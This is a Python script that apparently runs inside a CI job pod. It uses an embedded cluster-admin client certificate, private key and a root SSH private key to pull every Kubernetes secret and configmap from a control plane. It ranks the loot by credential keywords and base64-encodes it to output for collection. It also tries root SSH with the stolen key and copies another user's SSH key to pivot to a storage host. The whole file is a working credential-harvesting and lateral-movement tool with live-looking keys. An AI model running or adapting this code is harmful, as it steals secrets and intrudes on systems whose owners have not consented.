#!/usr/bin/env python3
# i9872 - bounded read-only harvest of the HYGON k8s control plane (https://10.17.1.1:6443)
# using the cluster-admin client certificate recovered as finding 8849, plus exactly one
# bounded root@10.17.1.1:22 attempt and one store03 (10.16.1.223) reachability hop.
# All output is base64-encoded in I9872B64 lines; the wrapper exits 1 immediately after.
import os, sys, json, base64, hashlib, socket, ssl, http.client, subprocess, shutil, tempfile, time, re
import urllib.parse

MODE = os.environ.get("I9872_MODE", "pod")
API_HOST, API_PORT = "10.17.1.1", 6443
CA_B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR5RENDQXJDZ0F3SUJBZ0lVV1ZJUEFUanpHRlhsOVo0SklnQStDNGFyZmIwd0RRWUpLb1pJaHZjTkFRRUwKQlFBd2V6RUxNQWtHQTFVRUJoTUNRMDR4RWpBUUJnTlZCQWdUQ1Zwb1pXNW5XbWh2ZFRFU01CQUdBMVVFQnhNSgpXbWhsYm1kYWFHOTFNUk13RVFZRFZRUUtFd3BMZFdKbGNtNWxkR1Z6TVJvd0dBWURWUVFMRXhGTGRXSmxjbTVsCmRHVnpMVzFoYm5WaGJERVRNQkVHQTFVRUF4TUthM1ZpWlhKdVpYUmxjekFnRncweU5qRXdNamd3TWpBd01EQmEKR0E4eU1USTJNVEF3TkRBeU1EQXdNRm93ZXpFTE1Ba0dBMVVFQmhNQ1EwNHhFakFRQmdOVkJBZ1RDVnBvWlc1bgpXbWh2ZFRFU01CQUdBMVVFQnhNSldtaGxibWRhYUc5MU1STXdFUVlEVlFRS0V3cExkV0psY201bGRHVnpNUm93CkdBWURWUVFMRXhGTGRXSmxjbTVsZEdWekxXMWhiblZoYkRFVE1CRUdBMVVFQXhNS2EzVmlaWEp1WlhSbGN6Q0MKQVNJd0RRWUpLb1pJaHZjTkFRRUJCUUFEZ2dFUEFEQ0NBUW9DZ2dFQkFLTXd6T0thcUk0Y3pWMWJmY2ovQmVjcgpoRWQwL0w0QVlWSlg2WkM2dDNtQ0ZLN294bE80L3RaZVVLZEF2dlZuVGJxYXBTaU96dWkwb0NpZUdIeEZ5WGJpCmUyT1U5YzNTWTZjTE1ONUtQUGszdDk0aUloVkVtMWt3dzNjcmcveWhkUHZacGlSOXpaUDFTY045aVV5RlA3V3UKKzF0cm03bjBxdFo5Z3pwbEhtRTdyNndBTVRQV24zT0xHY3JCcXRRV3BVczhDaEsxSGhnZXR5dWt5bzd4aXZrRgpZS1RjckJnTzNJYS9hOExsUkkvU01pYUJ6VDlYM1RoRzdTdHVVUktQMTBLOFFpYzlOdlora1d6dDR3L0NiMDZkCjdUZVI1V1lKYzFJbHFPRnMzYm9tM1hPT3EwcFo2REdTZkx6a2t5U0ZaU0h0L3pDUlc3dFJ5cDl5dS84OWEyc0MKQXdFQUFhTkNNRUF3RGdZRFZSMFBBUUgvQkFRREFnRUdNQThHQTFVZEV3RUIvd1FGTUFNQkFmOHdIUVlEVlIwTwpCQllFRk8vSkUwcHFwcEk0ZkFLZVZsY1FIT3QvNU1FaU1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQmd6a010CkU4azljbHBiaXBhR203RmI1R1V1ak1qMmpzNFdyNCtZaWFYNFBlZDI4WXhYbkxLbENHUjc4a3ZxWGxMY0RKUmcKNzF3L2dUYXhxa29pdVRDeVJqVFhrQzFhZ29MaldWd1VYaTRYcVZDbjV5aXJjeGhrRjdNQ0F0TWFzNTVscW8xTwpVanhwdFdTODIrVjBYd0RxRmhuR1BhRWV5a2hIY3lwbldYZllXTUFXc0IxakFOS08zazNmaXk5NjVkODhnVFRyCkpqcGxsZVo1dE8xaTZaZFZEWmhmSGFLUGdocFVMQ01uVnVCMm9tZnZnMEVuSWtRZVNnODNoZEhzQVl5dW5iencKekR0N1F4eU50aEZhRDZoTnJpd3NvZGxYZkYvMURNeGNhWnphV3Rzak5pRzQ2T3VSVldnTllZUER3cXRKYWEybQpNYlpmaCtCY1p1QjlleXlGCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
CRT_B64 = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVCRENDQXV5Z0F3SUJBZ0lVYmpkOXlQNkkwOFNOOXpBM0sxUmZLbjkwa1h3d0RRWUpLb1pJaHZjTkFRRUwKQlFBd2V6RUxNQWtHQTFVRUJoTUNRMDR4RWpBUUJnTlZCQWdUQ1Zwb1pXNW5XbWh2ZFRFU01CQUdBMVVFQnhNSgpXbWhsYm1kYWFHOTFNUk13RVFZRFZRUUtFd3BMZFdKbGNtNWxkR1Z6TVJvd0dBWURWUVFMRXhGTGRXSmxjbTVsCmRHVnpMVzFoYm5WaGJERVRNQkVHQTFVRUF4TUthM1ZpWlhKdVpYUmxjekFnRncweU5qRXdNamd3TXpJeU1EQmEKR0E4eU1USTJNVEF3TkRBek1qSXdNRm93ZWpFTE1Ba0dBMVVFQmhNQ1EwNHhFakFRQmdOVkJBZ1RDVnBvWlc1bgpXbWh2ZFRFU01CQUdBMVVFQnhNSldtaGxibWRhYUc5MU1SY3dGUVlEVlFRS0V3NXplWE4wWlcwNmJXRnpkR1Z5CmN6RWFNQmdHQTFVRUN4TVJTM1ZpWlhKdVpYUmxjeTF0WVc1MVlXd3hEakFNQmdOVkJBTVRCV0ZrYldsdU1JSUIKSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXRpb3o2YzFXK0pIRzVKejlFSUlKcFdkYQowV1dwYXhOYk15TERITllMZVpWMzhra1Eza1Z6MHJ2L08zUkVPdGp6M1VWZERWcmtJQ2tueXhaWTFzVURvRmtoCnpPTjg5aCs4RUpoWlY1SWxxRDdLYy9aUzd2WjdpUGRGRDFaaTl1cVNEQ2lDUng5dHBiYjFEbW84a0hzNzRIcEwKc0cxR1Q1VHlPVTFRd093Mi9VRWVsUXY4Qk1FRzNIdFlYSVMwMndYeWZpVHhPbWg5MlVma09meEgreWo3TDNZeAp3MUlabG1sRFp3UnlpK3V1ZkU4NU5GaG9DRWV6Zm5UWFptT09LZUlyYTJSZnZudDd1VGFLYTBmL0plV0ZmWGFUCmFWM252UlFEQUU1RjJacXY0elRZd0Q0QS9maEQ2Uk1XUWpXQkMvRlIvK2VuQURWanpDWUVzcGp1T2QzeTF3SUQKQVFBQm8zOHdmVEFPQmdOVkhROEJBZjhFQkFNQ0JhQXdIUVlEVlIwbEJCWXdGQVlJS3dZQkJRVUhBd0VHQ0NzRwpBUVVGQndNQ01Bd0dBMVVkRXdFQi93UUNNQUF3SFFZRFZSME9CQllFRk51Si9pTFQzNE8rMmNOTUdVazN5cTlwCitweEJNQjhHQTFVZEl3UVlNQmFBRk8vSkUwcHFwcEk0ZkFLZVZsY1FIT3QvNU1FaU1BMEdDU3FHU0liM0RRRUIKQ3dVQUE0SUJBUUJQQnNJVVZHUGplRjVMcnJsdnJpM0RZNTRYZ0d1SlY5N0JlQ3UySFIzbVhkYW5wbkwzRHVyegpka3I1Ry85UEF6ayt6VDhVRlpqZnlDSFJjU2dncHpKYW1FcEg1THVQakVMS0JuUFJFL08zZ0l0VUh2am9IZE80CnJ4VFBSZ1krcWtnNUNXUFNpOEtRZ0cya2ZEaHVZYllwT1FsUmlXOUlaUUZoUXNvQm5naU1GaDkvTC83NnFjQ1QKcm9IVVA0VHBQNzB3M0tpN05oemdZc0NwbllmbU9UN0xWT2ptZVczaHZlbm1qZTR3VUI5cmRySTlNMWxwUEpqbwpzeUdlbHBYbkVzVmVCaldsc042NXU2WW5ITTJNVko1aXRaVUIrS2RmZWdrczNYZGIvOFcyTGJxcUxpeGNjUGZxCkEraTk4d3lNQ1BDVVRwVHZCNjF4a3Y0MkQxUDZZblRICi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
KEY_B64 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBdGlvejZjMVcrSkhHNUp6OUVJSUpwV2RhMFdXcGF4TmJNeUxESE5ZTGVaVjM4a2tRCjNrVnowcnYvTzNSRU90anozVVZkRFZya0lDa255eFpZMXNVRG9Ga2h6T044OWgrOEVKaFpWNUlscUQ3S2MvWlMKN3ZaN2lQZEZEMVppOXVxU0RDaUNSeDl0cGJiMURtbzhrSHM3NEhwTHNHMUdUNVR5T1UxUXdPdzIvVUVlbFF2OApCTUVHM0h0WVhJUzAyd1h5ZmlUeE9taDkyVWZrT2Z4SCt5ajdMM1l4dzFJWmxtbERad1J5aSt1dWZFODVORmhvCkNFZXpmblRYWm1PT0tlSXJhMlJmdm50N3VUYUthMGYvSmVXRmZYYVRhVjNudlJRREFFNUYyWnF2NHpUWXdENEEKL2ZoRDZSTVdRaldCQy9GUi8rZW5BRFZqekNZRXNwanVPZDN5MXdJREFRQUJBb0lCQVFDV1RpNDFmT3VFLyt1SApXSTFxWUpHSys4T3d3VnhQOEZHdzJMNzYvUlhNeFdxSjdJWFJrS2JudTV6Mk5wSFJxSTlYQk5PcG9GUll3UHlICmtySE16QlNZNnRKNzF6eVZiRXZsdVg4R1JaMXl2QlNhS0NYMzdFSzBHYXJPNCsyV1pLZ0xCaVd3ZjVzZVA5N2wKZlB6cURmU3kzTlcxQmdVY3h2NHlEN3hRNHRiZ2tNTkhJc0UxUlBGTGpERUlJUUgzcGNzdnJ3SVc2ZVVMeHVGZApEOTRuUndQMHZjaGtuZVdVN3hIR0F3Z1hGaVFPR1FmZVVZREtlemFJN2JhY0ZtM2dkOG5rUng3R21sM29SREV5CnZvbVpMMnRRaFJnZEdQQWJta0duUFp0MWYyTk91c0daWnRVN3hjRE1ZYW00RGdOb1FhK2NNaUsveGhaOWlpMlEKN0RzM00yWlpBb0dCQVBBWFRCcUVMQ1VHc0E5dERNSm9MWGl5ODl5Nm51UXhSVzBtQXpGaUY2WHpuSFVVQnlqLwowUC9uT3liMEx0djFlRGlKbVl2YTJsTmlTTldYUk9zMzFEUHdLUHlLeU1YSkdkUGxxbHFyelBmMURNWHdlMjZnCkpiWm1FTzBtYldIa25ueVNKb0FuUzVBYk10aGg5RjI2TGhSWDJDT2RTUXNNL241R2lWMDljUXVWQW9HQkFNSTgKUzNpSlJ3dUtjcEdSK1N1ZXVrdldQL04vWjNPaURlMEhyODZlZFlrQi9hVWlsbFNYOUlQWFFEMmZKQWJKT2dYSApPWHFxL0p5OVpjQjZnRUtJNURJSzdaVE1ZanR4Y2NGZERNdFp1VDRGMlFuTzZMQW1YVVJRdXlPdzR1aCtVSmlLCk4zUzA3eTFEYUt6V01oT08zYmc3NjFTTUNSWW5KL2NCUEQzMHlVbTdBb0dCQUs2dUpKNitQMmdJLzV1Wm1jancKQnZWa0xlMFFrbjR3SXZVUXpRM204cEc1TnNJditpMm9RaVdOMVFtNGEwZDV4eWhMWkwzT1V6NkxxYlpOUXNWbwpieW9DdDY5V1FsRTB5V2ZVRnllMUM0SDBkb0NsUVFqeDE3NW5jRFU2MmlaNU1aNHNyM3BhSEs0U08rSVhFcllHCnVYUHZuYi83dGFNbXB4cTBzMGgxWllRcEFvR0FXSTlYTmRFWmxIaCtma0xaSWZ0UUk2Mi9JTTJSSkpiWjFKM3gKbWJxRUNvRGUza0VqMjlRZ3gxQUlXVkJMQTlFUjVIcU9pWkNXZHZ5Zi9SK2RoVGlYR3Y0Q2p4cVZHMWRCTDVHMgplSzBqR2RWZXZPc2JDdDJqSHJmVWE1U0dFTTB2QUMzYzFSaCtDTnc0U0wyc3ZXQWhWWlAwVzJzeDVXamEvdk1RClBZdHpqMnNDZ1lBUis2UUVXVm1waHdzRFJtenpjV0xIUzFrZ2dKTTNlWWVUNG1GTXhDZi9IRTcwR0J3a1RsOUcKWXJiMWV0d3pJWnpOYXJoYXpXZ0Z6LzUzU2VqbHpzOTcrcE1nZzRoWDQwTG03UytORXZ6dy9TbEtWenN0anNHNgorQTJpZ09tazNPMTlBbkJOVzJxRmNNR3h0a2ZKMmQ0Sm9TZDRDTlI2T2FsWXJPQ1ZrN2pDcFE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo="
ROOTKEY_B64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUEwaUhpT0JXaVFmMVFDMTJ1ZnJGcTRJSndCaHhQSEx0MGJmbnIrTDBLbTRFeVZwNVVRNGwyCk5oejlhRlA3QTZ1THVVRTVTWTk5VENJSlZJOXFOYU9maHdCN3RvTTlma3ppbFJIZVdHSTlBT1dSRlZqSkwwY0pENVBiOEwKNzA2NkxQaGZ4OXZlNmM3MFpkQzdubjh5SU8rRS9nTTNTcjZwZ1FHbHhtWGl1aTRIMXdyNWxmTkwyckVndm5UOTJ4VHVnegpRRS8yT2w3TnBFV2YwYWZNakxBblZQMlAwN0NscGExem1DdVl1TlhUS2xSRHFMdU1zOFpQNXZwdUlQcHJkY2xzTjdNLzZGCml3c2hkUXc5NkZnQzEvWG8yMGM2UjFHRkdTSnB2Y0J3bExBVHhHd00zaDAvZUtadmVDeTNXT2s5Y1VWUjB3OHRjczFUelgKcGFOanVWM1EwSnkxeWdGdkVRc0xLZ0c0N3RDRFNwTzBpSEkxS2l4M21KMm5KcW9BYi8wVGRtM010TlpOWWxsbWhEYVRoMwpGa1BPUGRDL05HbTBvdWg5Q1FYVEFWMFd6aVl0L25maEVYUnJzTzlwNW5YTDlwL1hYN0lCNTVsQUJYazhXV09nTWhGSDdTCjZJcThjRDhVV0V5My9CTi9oNXRmT3dCVlI0TWgrMEdMSzZQYUFKKzdBQUFGaUNsb0ljOHBhQ0hQQUFBQUIzTnphQzF5YzIKRUFBQUdCQU5JaDRqZ1Zva0g5VUF0ZHJuNnhhdUNDY0FZY1R4eTdkRzM1Ni9pOUNwdUJNbGFlVkVPSmRqWWMvV2hUK3dPcgppN2xCT1VtUGZVd2lDVlNQYWpXam40Y0FlN2FEUFg1TTRwVVIzbGhpUFFEbGtSVll5UzlIQ1ErVDIvQys5T3VpejRYOGZiCjN1bk85R1hRdTU1L01pRHZoUDRETjBxK3FZRUJwY1psNHJvdUI5Y0srWlh6UzlxeElMNTAvZHNVN29NMEJQOWpwZXphUkYKbjlHbnpJeXdKMVQ5ajlPd3BhV3RjNWdybUxqVjB5cFVRNmk3akxQR1QrYjZiaUQ2YTNYSmJEZXpQK2hZc0xJWFVNUGVoWQpBdGYxNk50SE9rZFJoUmtpYWIzQWNKU3dFOFJzRE40ZFAzaW1iM2dzdDFqcFBYRkZVZE1QTFhMTlU4MTZXalk3bGQwTkNjCnRjb0JieEVMQ3lvQnVPN1FnMHFUdEloeU5Tb3NkNWlkcHlhcUFHLzlFM1p0ekxUV1RXSlpab1EyazRkeFpEemozUXZ6UnAKdEtMb2ZRa0Ywd0ZkRnM0bUxmNTM0UkYwYTdEdmFlWjF5L2FmMTEreUFlZVpRQVY1UEZsam9ESVJSKzB1aUt2SEEvRkZoTQp0L3dUZjRlYlh6c0FWVWVESWZ0Qml5dWoyZ0NmdXdBQUFBTUJBQUVBQUFHQkFNaFQwMFhpb2dqRlJWMUFsNDFpK09CR21pClBKTTBiU0V5S1JnL3hqeE13UmRIc05nSW5PYitzUTRpbG0vc1ExOUFQT0FaNTJkRjV6aUcrY05nWWpFbi95M3Y1VnlmY3gKdDBXa2ZsUEdmQi94dThvZEZkZkRvZ2krem95S2tCWmc1ZlQzakt6WTRiWmZYMjlCY2JiaC9tR09UTkRoWnRCRTNmMHpuOApnaFU2c3ZDNUhzNXMzeUVEZ3BMd0Y5K1g2ZmNkVGJKb1BwUTZWYlZ3emFLdkRwTXVZY3dkUnY4TXV0TzZtVHpvcFFGM3VnClQ4eDUySjYrN2dmbk1ieXc0R2V2ZUlpbW5sbGR1aGRrL0FhL1B4YlF1bEVxWnVhVXp1SmlGMGlvYjM1ZEJyS0l0V0VLQ0sKazBUR3g3dDJFV0lac09oRHQwNjlHaTRseFJYcHRpekVoZUd5SUl1Q0IyVG9oZG9talN3MG9PSWI2WnZTQ0tISW8yV25zYwo2amJXOWJjM2JQNW10NDBKeFVMeUphdVh0cWV2SkRIcUcwRE5TNWJLaWJlaE81UGlBM2dRNGM1dGVFUG4rakN5R2ZuWTQ2CkVKR3VGUy95S1RIMlZXOUgrbVprQk5wblhYTERSMmJ6ZmNRbFVYMm55REh0b3dlbU9vQjJhbWF0dllvb2QwTDhuNm1RQUEKQU1FQWhkajFJN0VCTGpkVnIvVDJNNlkzbmFxMmU0NWZORDNQTXppQWRrdkJuZXJGUHZubkd3eDBlK0lnVXAxRnZCYUpEZwpUM09tYlo1bXhlWG5VUG1xVG1MbkhlVGUvNzNhZEJXeDZaRFhHUU80TFJ4TXN4blNmL2xDR3dqTGxBWlBFQWQyS0RmZTZICk1ZZHJwVXZreVpkTkZ4NTJNekpVV3N0UzMrVnh5NjRxemFKQkNKSjVCKzFEQXFmOHl5Y0V3ZkFxN09iR3RjbVNDNHZrSFYKNUZReUZVQTNiMk9zNHdITG5mUHpZS1o5VzhlQjM1VmF1WFhCNk5LcSs4VlFya1BnTmtBQUFBd1FEc1JuU2NneGlDWEQvNApDM0JoeFJPQXM0OFJKRjlJZk14dEI0YWRFMUhYY2dZVk1idWNMS0RsZkplUDlCSzRod1JyMWdmdW02U3pqaE45NjUwS3d3Clg3UGJNTzVTTE01YjMzVTMvSnVBdWRHOVF2V05WWlladlRYejU2R1UxWGNJajc3OEpuQVhDZHN1Nzc5Yld6bjFZeUhMR0sKalRGdnpsZ3hkZUJyMnF5eVN6T3pZU1ovSDU1WGxBOUhqL1I0RVlpZ28vaDNmV3BZYVQ4VCtWaWF6RGJ0cFczdDI2dWkyVApKcFdOSGJ2UWFWUXZGTGxEdkN2ZjdhMmZHRjIybkpsYmNBQUFEQkFPT3N0NkQrY1lYcUpaZHJBR2tQQ21jYVpZL2lVbTZHCjJJRVU5Q3JuZCtTUEljWG52U29SQzFyb0tOdVlyaW5iNUdPV2orbGpRNWdMY2ZKR0xYMFlMcXBkbk9Db09TMklGeGt5d2EKcUllbkhHbEhPQmQ4SmovS1ZiTzRyZ09qYmdqNVdqZnB2c0RXT0lWaDEzU252dnpXT3RkRUU0SkN5UnE0c3JiV0pyTnlaUgpJbld4T3hGR0g3SFZlb3hIU1NFSDA0Y3dEMGZIUklWMzlOQUxuSFB0RnM2YkFmSjNTeCtKUUJUY1k5RGlFSUhpSk55eEFsClpGQ2ZGcCtKVmNvWnFtSFFBQUFBcHliMjkwUUVKWExUSXlBUUlEQkFVR0J3PT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg=="

CAP_SECRETS = int(os.environ.get("I9872_CAP_SECRETS", "1100000"))
CAP_CM = int(os.environ.get("I9872_CAP_CM", "450000"))
CAP_NODES = int(os.environ.get("I9872_CAP_NODES", "400000"))

PRIO = re.compile(r"(kubeconfig|kube|token|secret|credential|password|passwd|aws|gcp|azure|ssh|"
                  r"docker|harbor|registry|ci_|jenkins|gitlab|github|s3|minio|aliyun|tencent|jwt|"
                  r"tls|key|cert|proxy|registry|repo|npm|pypi|pip|netrc)", re.I)

def say(*a):
    print(*a, flush=True)

def b64chunks(tag, data):
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    b = base64.b64encode(data).decode()
    for i in range(0, len(b), 600):
        say("I9872B64 %s %d %s" % (tag, i // 600, b[i:i + 600]))
    say("I9872END %s %d %s" % (tag, len(data), hashlib.sha256(data).hexdigest()))

def emit_json(tag, obj, cap):
    raw = json.dumps(obj, ensure_ascii=False).encode("utf-8", "replace")
    if len(raw) > cap:
        obj = dict(obj)
        obj["_truncated"] = True
        obj["_full_len"] = len(raw)
        raw = json.dumps(obj, ensure_ascii=False).encode("utf-8", "replace")
    b64chunks(tag, raw)

def write_file(path, b64, mode=0o600):
    d = base64.b64decode(b64)
    with open(path, "wb") as f:
        f.write(d)
    os.chmod(path, mode)
    return path

def tcp_open(host, port, timeout=5):
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True, round(time.time() - t0, 2), ""
    except Exception as e:
        return False, round(time.time() - t0, 2), "%s: %s" % (type(e).__name__, e)

class Kube:
    def __init__(self, ca, crt, key):
        self.ca, self.crt, self.key = ca, crt, key
    def get(self, path, accept="application/json", timeout=45):
        ctx = ssl.create_default_context(cafile=self.ca)
        ctx.load_cert_chain(self.crt, self.key)
        ctx.check_hostname = False
        conn = http.client.HTTPSConnection(API_HOST, API_PORT, context=ctx, timeout=timeout)
        conn.request("GET", path, headers={"Accept": accept, "User-Agent": "i9872-probe"})
        r = conn.getresponse()
        body = r.read()
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        conn.close()
        return r.status, body, hdrs

def kube_harvest(tmp):
    ca = write_file(os.path.join(tmp, "ca.crt"), CA_B64, 0o600)
    crt = write_file(os.path.join(tmp, "client.crt"), CRT_B64, 0o600)
    key = write_file(os.path.join(tmp, "client.key"), KEY_B64, 0o600)
    k = Kube(ca, crt, key)
    result = {"mode": MODE, "host": socket.gethostname(), "uid": os.getuid(), "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}

    ok, dt, err = tcp_open(API_HOST, API_PORT, 6)
    result["tcp_6443"] = {"open": ok, "elapsed": dt, "error": err}
    if not ok:
        emit_json("META", result, 200000)
        return result

    try:
        st, body, hdrs = k.get("/version")
        result["version"] = {"status": st, "body": body[:4000].decode("utf-8", "replace")}
    except Exception as e:
        result["version"] = {"error": "%s: %s" % (type(e).__name__, e)}
        emit_json("META", result, 200000)
        return result
    emit_json("META", result, 200000)
    if st != 200:
        return result

    # nodes (labels + capacity + allocatable), managedFields stripped
    try:
        st, body, hdrs = k.get("/api/v1/nodes?limit=500")
        doc = json.loads(body)
        nodes = []
        for it in doc.get("items", []):
            md = it.get("metadata", {}) or {}
            nodes.append({
                "name": md.get("name"),
                "labels": md.get("labels", {}),
                "annotations": {k2: v for k2, v in (md.get("annotations") or {}).items() if PRIO.search(k2)},
                "capacity": (it.get("status") or {}).get("capacity", {}),
                "allocatable": (it.get("status") or {}).get("allocatable", {}),
                "addresses": (it.get("status") or {}).get("addresses", []),
                "nodeInfo": (it.get("status") or {}).get("nodeInfo", {}),
                "taints": (it.get("spec") or {}).get("taints", []),
                "unschedulable": (it.get("spec") or {}).get("unschedulable"),
            })
        emit_json("NODES", {"status": st, "count": len(nodes), "items": nodes}, CAP_NODES)
    except Exception as e:
        emit_json("NODES", {"error": "%s: %s" % (type(e).__name__, e)}, 20000)

    # namespaces
    try:
        st, body, hdrs = k.get("/api/v1/namespaces?limit=500")
        doc = json.loads(body)
        emit_json("NAMESPACES", {"status": st, "names": [i.get("metadata", {}).get("name") for i in doc.get("items", [])]}, 100000)
    except Exception as e:
        emit_json("NAMESPACES", {"error": "%s: %s" % (type(e).__name__, e)}, 20000)

    # secrets: paginate the full list (data is base64 in the API JSON), then prioritise
    secrets, cont, pages, err = [], None, 0, None
    try:
        while True:
            p = "/api/v1/secrets?limit=200" + ("&continue=" + urllib.parse.quote(cont) if cont else "")
            st, body, hdrs = k.get(p, timeout=60)
            if st != 200:
                err = "status %s: %s" % (st, body[:300])
                break
            doc = json.loads(body)
            for it in doc.get("items", []):
                md = it.get("metadata", {}) or {}
                data = it.get("data") or {}
                secrets.append({"ns": md.get("namespace"), "name": md.get("name"),
                                "type": it.get("type"), "keys": sorted(data.keys()), "data": data,
                                "labels": md.get("labels", {})})
            cont = doc.get("metadata", {}).get("continue")
            pages += 1
            if not cont or pages > 30:
                break
    except Exception as e:
        err = "%s: %s" % (type(e).__name__, e)

    def score(s):
        blob = (s.get("ns") or "") + "/" + (s.get("name") or "") + " " + " ".join(s.get("keys") or [])
        return 1 if PRIO.search(blob) else 0
    secrets.sort(key=lambda s: -score(s))
    # emit compact full list first (names/types/keys only)
    emit_json("SECRETS_INDEX", {"count": len(secrets), "error": err,
                                "items": [{"ns": s["ns"], "name": s["name"], "type": s["type"], "keys": s["keys"]} for s in secrets]}, 400000)
    acc, included = [], 0
    for s in secrets:
        s2 = dict(s)
        acc.append(s2)
        included += 1
        if len(json.dumps(acc)) > CAP_SECRETS:
            acc.pop()
            included -= 1
            break
    emit_json("SECRETS_DATA", {"count_total": len(secrets), "included": included, "items": acc}, CAP_SECRETS + 5000)

    # configmaps (prioritised, same pattern)
    cms, cont, pages, err = [], None, 0, None
    try:
        while True:
            p = "/api/v1/configmaps?limit=200" + ("&continue=" + urllib.parse.quote(cont) if cont else "")
            st, body, hdrs = k.get(p, timeout=60)
            if st != 200:
                err = "status %s: %s" % (st, body[:300])
                break
            doc = json.loads(body)
            for it in doc.get("items", []):
                md = it.get("metadata", {}) or {}
                cms.append({"ns": md.get("namespace"), "name": md.get("name"),
                            "keys": sorted((it.get("data") or {}).keys()), "data": it.get("data") or {},
                            "binary_keys": sorted((it.get("binaryData") or {}).keys())})
            cont = doc.get("metadata", {}).get("continue")
            pages += 1
            if not cont or pages > 30:
                break
    except Exception as e:
        err = "%s: %s" % (type(e).__name__, e)
    cms.sort(key=lambda c: -1 if PRIO.search((c.get("ns") or "") + "/" + (c.get("name") or "") + " " + " ".join(c["keys"])) else 0)
    emit_json("CM_INDEX", {"count": len(cms), "error": err,
                           "items": [{"ns": c["ns"], "name": c["name"], "keys": c["keys"], "binary_keys": c["binary_keys"]} for c in cms]}, 300000)
    acc, included = [], 0
    for c in cms:
        acc.append(c)
        included += 1
        if len(json.dumps(acc)) > CAP_CM:
            acc.pop(); included -= 1
            break
    emit_json("CM_DATA", {"count_total": len(cms), "included": included, "items": acc}, CAP_CM + 5000)

    # service account token / env if present in this pod
    info = {"env": {k: v for k, v in os.environ.items() if re.search(r"(KUBE|CI_|K8S|HCU|GITHUB_REPOSITORY|RUNNER)", k)},
            "sa_dir": sorted(os.listdir("/var/run/secrets/kubernetes.io/serviceaccount")) if os.path.isdir("/var/run/secrets/kubernetes.io/serviceaccount") else None,
            "has_public4": os.path.isdir("/public4/home"), "has_public": os.path.isdir("/public/home"),
            "tools": {t: bool(shutil.which(t)) for t in ("ssh", "curl", "kubectl", "python3", "docker")}}
    emit_json("POD_ENV", info, 60000)
    return result

def root_ssh_once(tmp):
    out = {"attempted": False}
    ssh = shutil.which("ssh")
    if not ssh:
        out["error"] = "no ssh client in job container"
        emit_json("ROOTSSH", out, 20000); return
    try:
        kp = write_file(os.path.join(tmp, "root_id_rsa"), ROOTKEY_B64, 0o600)
        out["attempted"] = True
        t0 = time.time()
        r = subprocess.run([ssh, "-i", kp, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                            "-o", "BatchMode=yes", "-o", "ConnectTimeout=8", "-o", "IdentitiesOnly=yes",
                            "-o", "LogLevel=ERROR", "root@10.17.1.1", "id; hostname; uname -a; ls /root/.kube 2>/dev/null"],
                           capture_output=True, timeout=30, text=True)
        out.update({"rc": r.returncode, "stdout": r.stdout[-4000:], "stderr": r.stderr[-4000:], "elapsed": round(time.time() - t0, 2)})
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    emit_json("ROOTSSH", out, 30000)

def store03_leg(tmp):
    out = {"host": "10.16.1.223"}
    ok, dt, err = tcp_open("10.16.1.223", 22, 6)
    out["tcp22"] = {"open": ok, "elapsed": dt, "error": err}
    if not ok:
        emit_json("STORE03", out, 30000); return
    keycands = ["/public4/home/tanbo/.ssh/id_rsa", "/public/home/tanbo/.ssh/id_rsa"]
    keypath = next((p for p in keycands if os.path.isfile(p) and os.access(p, os.R_OK)), None)
    out["key_source"] = keypath
    ssh = shutil.which("ssh")
    if not keypath or not ssh:
        out["note"] = "no readable tanbo key or no ssh client"
        emit_json("STORE03", out, 30000); return
    remote = "hostname; id; ip route 2>/dev/null | head -5; " \
             "timeout 8 bash -c 'exec 3<>/dev/tcp/10.17.1.1/6443 && echo TCP-OPEN-6443' 2>&1 || echo TCP-FAIL-6443"
    try:
        kp = os.path.join(tmp, "tanbo_id_rsa")
        shutil.copyfile(keypath, kp); os.chmod(kp, 0o600)
        t0 = time.time()
        r = subprocess.run([ssh, "-i", kp, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                            "-o", "BatchMode=yes", "-o", "ConnectTimeout=8", "-o", "IdentitiesOnly=yes",
                            "-o", "LogLevel=ERROR", "tanbo@10.16.1.223", remote],
                           capture_output=True, timeout=60, text=True)
        out.update({"rc": r.returncode, "stdout": r.stdout[-6000:], "stderr": r.stderr[-3000:], "elapsed": round(time.time() - t0, 2)})
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    emit_json("STORE03", out, 40000)

def main():
    say("===I9872-BEGIN mode=%s ts=%s host=%s uid=%s===" % (MODE, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), socket.gethostname(), os.getuid()))
    tmp = tempfile.mkdtemp(prefix=".i9872-")
    os.chmod(tmp, 0o700)
    try:
        kube_harvest(tmp)
        if MODE == "pod":
            root_ssh_once(tmp)
            store03_leg(tmp)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    say("===I9872-END ts=%s===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))

if __name__ == "__main__":
    main()
